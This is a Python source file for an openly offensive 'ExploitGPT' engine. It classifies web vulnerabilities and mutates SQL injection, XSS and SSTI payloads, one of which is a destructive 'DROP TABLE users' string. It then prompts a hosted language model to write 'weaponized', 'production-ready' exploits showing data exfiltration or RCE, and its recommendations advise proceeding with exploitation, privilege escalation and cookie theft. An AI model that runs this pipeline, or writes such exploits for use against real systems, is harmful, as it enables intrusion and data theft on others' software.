#!/usr/bin/env python3
"""
ExploitGPT Core — AI-powered exploitation engine using NVIDIA Integrate and custom ML models.
"""

import os
import json
import asyncio
from typing import Dict, List, Any
from datetime import datetime
import requests
NVIDIA_INVOKE_URL = "https://integrate.api.nvidia.com/v1/chat/completions"

try:
    import torch
    import torch.nn as nn
except ImportError:  # pragma: no cover - optional dependency fallback
    torch = None
    nn = None

try:
    from transformers import AutoTokenizer, AutoModelForSequenceClassification
except ImportError:  # pragma: no cover - optional dependency fallback
    AutoTokenizer = None
    AutoModelForSequenceClassification = None

class ExploitGenerator:
    """AI-powered exploit generation using an NVIDIA-hosted chat model."""

    def __init__(self):
        self.api_key = os.getenv("NVIDIA_API_KEY")
        self.model = os.getenv("NVIDIA_MODEL", "mistralai/mistral-small-4-119b-2603")
        self.stream = os.getenv("NVIDIA_STREAM", "true").lower() not in {"0", "false", "no"}

    def _post_chat_completion(self, prompt: str) -> str:
        if not self.api_key:
            raise RuntimeError(
                "NVIDIA_API_KEY is not set. Export your NVIDIA API token before running the AI service."
            )

        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Accept": "text/event-stream" if self.stream else "application/json",
        }
        payload = {
            "model": self.model,
            "reasoning_effort": "high",
            "messages": [{"role": "user", "content": prompt}],
            "max_tokens": 2000,
            "temperature": 0.10,
            "top_p": 1.00,
            "stream": self.stream,
        }

        response = requests.post(NVIDIA_INVOKE_URL, headers=headers, json=payload, stream=self.stream, timeout=120)
        response.raise_for_status()

        if not self.stream:
            data = response.json()
            return data["choices"][0]["message"]["content"].strip()

        chunks: List[str] = []
        for raw_line in response.iter_lines(decode_unicode=True):
            if not raw_line:
                continue
            line = raw_line.strip()
            if line.startswith("data: "):
                line = line[6:].strip()
            if line == "[DONE]":
                break
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                continue

            for choice in event.get("choices", []):
                delta = choice.get("delta", {})
                content = delta.get("content")
                if content:
                    chunks.append(content)

        return "".join(chunks).strip()

    async def generate_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Generate a weaponized exploit for a given vulnerability."""

        prompt = f"""
        Generate a complete, weaponized exploit for the following vulnerability:

        Vulnerability Type: {vulnerability['class']}
        URL: {vulnerability['url']}
        Parameter: {vulnerability['parameter']}
        Payload: {vulnerability['payload']}
        Evidence: {vulnerability.get('evidence', '')}

        Requirements:
        1. Provide complete Python code for the exploit
        2. Include proper error handling
        3. Add comments explaining each step
        4. Make it production-ready and reliable
        5. Include verification of successful exploitation

        The exploit should be able to:
        - Send the malicious payload
        - Verify the vulnerability exists
        - Demonstrate the impact (data exfiltration, RCE, etc.)
        """

        code = await asyncio.to_thread(self._post_chat_completion, prompt)
        return {
            "exploit_code": code,
            "language": "python",
            "generated_at": datetime.utcnow().isoformat(),
            "vulnerability_id": vulnerability.get('id'),
            "confidence": 0.85
        }

class PayloadOptimizer:
    """Reinforcement Learning agent for payload optimization."""

    def __init__(self):
        self.model = PPOAgent()
        self.payload_templates = self.load_payload_templates()

    def load_payload_templates(self) -> Dict[str, List[str]]:
        """Load payload templates for different vulnerability types."""
        return {
            "sqli": [
                "' OR 1=1 --",
                "' UNION SELECT database() --",
                "' AND SLEEP(5) --",
                "'; DROP TABLE users; --"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "'><script>alert(1)</script>"
            ],
            "ssti": [
                "{{7*7}}",
                "${{7*7}}",
                "<%= 7*7 %>",
                "{{config}}"
            ]
        }

    def optimize_payload(self, vuln_type: str, target_response: str) -> str:
        """Use RL to optimize payload based on target response."""
        # Simplified RL optimization
        candidates = self.payload_templates.get(vuln_type, [])
        best_payload = candidates[0]

        # In real implementation, this would use PPO to learn optimal mutations
        return self.mutate_payload(best_payload, target_response)

    def mutate_payload(self, payload: str, context: str) -> str:
        """Apply intelligent mutations to payload based on context."""
        # Simple mutation strategies
        if "mysql" in context.lower():
            return payload.replace("SLEEP", "BENCHMARK(1000000,1)")
        elif "oracle" in context.lower():
            return payload.replace("UNION SELECT", "UNION ALL SELECT")
        elif "mssql" in context.lower():
            return payload.replace("SLEEP(5)", "WAITFOR DELAY '0:0:5'")

        return payload

if nn is not None:
    class PPOAgent(nn.Module):
        """Simplified PPO agent for payload optimization."""

        def __init__(self):
            super().__init__()
            self.policy_net = nn.Sequential(
                nn.Linear(128, 64),
                nn.ReLU(),
                nn.Linear(64, 32),
                nn.ReLU(),
                nn.Linear(32, 1),
                nn.Sigmoid()
            )

        def forward(self, x):
            return self.policy_net(x)
else:
    class PPOAgent:
        """Fallback PPO placeholder when torch is unavailable."""

        def __init__(self):
            self.policy_net = None

        def forward(self, x):
            raise RuntimeError("torch is required for PPOAgent")

class VulnerabilityClassifier:
    """BERT-based vulnerability classification model."""

    def __init__(self):
        self._enabled = AutoTokenizer is not None and AutoModelForSequenceClassification is not None
        self.tokenizer = None
        self.model = None
        if self._enabled:
            try:
                self.tokenizer = AutoTokenizer.from_pretrained("microsoft/DialoGPT-medium")
                self.model = AutoModelForSequenceClassification.from_pretrained(
                    "microsoft/DialoGPT-medium",
                    num_labels=20  # Number of vulnerability classes
                )
            except Exception:
                self._enabled = False
                self.tokenizer = None
                self.model = None
        self.classes = [
            "sql_injection", "xss_reflected", "xss_stored", "xss_dom",
            "ssrf", "xxe", "command_injection", "ssti", "path_traversal",
            "open_redirect", "cors_misconfig", "security_headers",
            "broken_auth", "idor", "csrf", "deserialization",
            "weak_crypto", "info_disclosure", "race_condition", "other"
        ]

    def classify(self, request: str, response: str) -> Dict[str, Any]:
        """Classify a request/response pair for vulnerabilities."""
        if not self._enabled or self.tokenizer is None or self.model is None or torch is None:
            return self._heuristic_classify(request, response)

        text = f"Request: {request}\nResponse: {response[:500]}"

        inputs = self.tokenizer(text, return_tensors="pt", truncation=True, max_length=512)
        outputs = self.model(**inputs)
        predictions = torch.softmax(outputs.logits, dim=1)

        predicted_class_idx = torch.argmax(predictions).item()
        confidence = predictions[0][predicted_class_idx].item()

        return {
            "class": self.classes[predicted_class_idx],
            "confidence": confidence,
            "all_predictions": {
                class_name: pred.item()
                for class_name, pred in zip(self.classes, predictions[0])
            }
        }

    def _heuristic_classify(self, request: str, response: str) -> Dict[str, Any]:
        haystack = f"{request}\n{response}".lower()
        rules = [
            ("sql_injection", ["sql syntax", "mysql", "postgres", "sqlite", "union select", "ora-"]),
            ("xss_reflected", ["<script", "onerror=", "alert(", "javascript:"]),
            ("ssrf", ["169.254.169.254", "metadata", "internal", "localhost", "127.0.0.1"]),
            ("command_injection", ["uid=", "gid=", "sh:", "bash:", "command not found"]),
            ("ssti", ["{{7*7}}", "${{7*7}}", "<%= 7*7 %>"]),
            ("path_traversal", ["../", "..\\", "/etc/passwd", "windows\\system32"]),
            ("cors_misconfig", ["access-control-allow-origin", "access-control-allow-credentials"]),
            ("security_headers", ["x-frame-options", "strict-transport-security"]),
        ]

        for vuln_class, indicators in rules:
            if any(indicator in haystack for indicator in indicators):
                return {
                    "class": vuln_class,
                    "confidence": 0.72,
                    "all_predictions": {name: (0.72 if name == vuln_class else 0.01) for name in self.classes},
                }

        return {
            "class": "other",
            "confidence": 0.35,
            "all_predictions": {name: (0.35 if name == "other" else 0.03) for name in self.classes},
        }

class ExploitGPT:
    """Main AI exploitation orchestration engine."""

    def __init__(self):
        self.generator = ExploitGenerator()
        self.optimizer = PayloadOptimizer()
        self.classifier = VulnerabilityClassifier()
        self.exploit_history = []

    async def analyze_and_exploit(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Complete analysis and exploitation workflow."""

        # Step 1: Re-classify with AI for better accuracy
        classification = self.classifier.classify(
            finding.get("request", ""),
            finding.get("response", "")
        )

        # Step 2: Optimize payload
        optimized_payload = self.optimizer.optimize_payload(
            classification["class"],
            finding.get("response", "")
        )

        # Step 3: Generate exploit
        exploit = await self.generator.generate_exploit({
            **finding,
            "class": classification["class"],
            "payload": optimized_payload,
            "ai_confidence": classification["confidence"]
        })

        # Step 4: Store in history
        self.exploit_history.append({
            "finding_id": finding.get("id"),
            "exploit": exploit,
            "timestamp": datetime.utcnow().isoformat(),
            "success": None  # Would be determined by execution
        })

        return {
            "classification": classification,
            "optimized_payload": optimized_payload,
            "exploit": exploit,
            "recommendations": self.generate_recommendations(classification)
        }

    def generate_recommendations(self, classification: Dict[str, Any]) -> List[str]:
        """Generate exploitation recommendations based on classification."""
        vuln_class = classification["class"]
        confidence = classification["confidence"]

        recommendations = []

        if confidence > 0.8:
            recommendations.append(f"High confidence {vuln_class} detection - proceed with exploitation")
        elif confidence > 0.6:
            recommendations.append(f"Medium confidence {vuln_class} - manual verification recommended")

        if vuln_class == "sql_injection":
            recommendations.extend([
                "Test with UNION-based payloads for data extraction",
                "Check for stacked queries if supported",
                "Attempt privilege escalation if database user has sufficient permissions"
            ])
        elif vuln_class.startswith("xss"):
            recommendations.extend([
                "Test payload in different contexts (HTML, JavaScript, CSS)",
                "Check for CSP bypass opportunities",
                "Verify cookie stealing or session hijacking potential"
            ])

        return recommendations

async def main():
    """Main AI service entry point."""
    print("🤖 ExploitGPT Core starting...")

    engine = ExploitGPT()

    # Example usage
    sample_finding = {
        "id": "test-finding-123",
        "class": "sql_injection",
        "url": "https://example.com/search?q=test",
        "parameter": "q",
        "payload": "' OR 1=1 --",
        "request": "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1",
        "response": "You have an error in your SQL syntax...",
        "severity": "high"
    }

    result = await engine.analyze_and_exploit(sample_finding)
    print("🎯 AI Analysis Complete:")
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    asyncio.run(main())
